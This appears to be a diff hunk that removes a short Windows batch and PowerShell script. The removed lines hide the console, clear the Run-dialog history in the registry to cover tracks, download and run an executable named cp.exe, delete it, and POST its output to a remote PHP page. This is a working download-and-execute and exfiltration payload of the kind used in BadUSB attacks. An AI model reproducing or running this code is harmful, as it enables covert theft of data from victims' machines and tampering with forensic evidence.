@@ -1,3 +1,0 @@
-mode con: cols=15 lines=1
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-powershell "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"; "Invoke-WebRequest -Uri https://redcoconut.github.io/Redc/cp.exe -OutFile C:/Users/$env:UserName/Downloads/cp.exe -UseBasicParsing"; "cd C:/Users/$env:UserName/Downloads"; "$One = cmd /c 'cp.exe'"; "cmd /c "del /f cp.exe""; "$One = [string]::join(\"ENTERR\",($One.Split(\"`n\")))"; "$content = "$One""; "$URI = 'http://red.scienceontheweb.net/filetest.php'"; "$Body ='name=' + $content + '&B1=SUBMIT%21'"; "$page = Invoke-WebRequest $URI -body $Body -method POST" 
